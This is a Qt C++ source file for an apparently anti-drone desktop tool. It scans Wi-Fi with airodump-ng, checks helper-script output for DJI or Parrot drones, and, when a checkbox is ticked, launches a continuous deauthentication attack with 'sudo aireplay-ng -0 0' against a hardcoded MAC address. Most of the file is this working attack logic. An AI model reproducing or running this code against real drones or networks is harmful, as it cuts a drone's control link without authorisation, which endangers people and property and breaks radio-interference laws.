#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ui->label->setText("No drone detected");
    scanProc = new QProcess();
    checkProc = new QProcess();
    attackDjiProc = new QProcess();
    checkTimer = new QTimer();
    prepProc = new QProcess();
    checkTimer->setInterval(500);
    connect(checkTimer,SIGNAL(timeout()),this,SLOT(runCheck()));
    connect(checkProc,SIGNAL(readyReadStandardOutput()),this,SLOT(readScript()));
    prepProc->start("sudo sh prep.sh");
    scanProc->start("sudo airodump-ng -w dump wlan0");
    checkTimer->start();
}

MainWindow::~MainWindow()
{
    scanProc->kill();
    checkProc->kill();
    fin.close();
    delete ui;
}



 void MainWindow::readScript()
{
    QString input;
    // QString macAddr;
    input = checkProc->readAllStandardOutput();
    //qDebug() << input;
    if (input.contains(':'))
    {
        macAddr = "60:60:1F:04:74:40";
        qDebug() << "ADDRESS: " << macAddr;

    }

    if (input == "DJI\n") //valid message
    {
        ui->label->setText("DJI Found");
        scanProc->kill(); //kill scanning script
        if (ui->checkBox->isChecked())
        { 
          attackDjiTelem(macAddr);
        }
    }

    else if (input == "Parrot AP Found!")
    {
        ui->label->setText(input);
    }
    checkTimer->stop();
}


void MainWindow::runCheck()
{
    checkProc->start("sh grep2.sh");
}



void MainWindow::attackDjiTelem(QString &address)
{
        qDebug() << macAddr;
    //deauth script
    //std::string attackString;

    //QFile file("dump.txt");
    //fin.open("dump.txt");
    //if (file.open(QIODevice::ReadOnly | QIODevice::Text))
    //{
        //getline(fin,attackString);
        //std::getline(fin,)
        //as.fromStdString("test");
        //ui->label->setText(QString::fromStdString(attackString));
        qDebug() << "aireplay-ng -0 0 -a " + address + " wlan0";
        attackDjiProc->start("sudo aireplay-ng -0 0 -a " + address + " wlan0");
        checkTimer->stop();
    //}
    //file.close();

    //qDebug() << "attacknig telem";
}
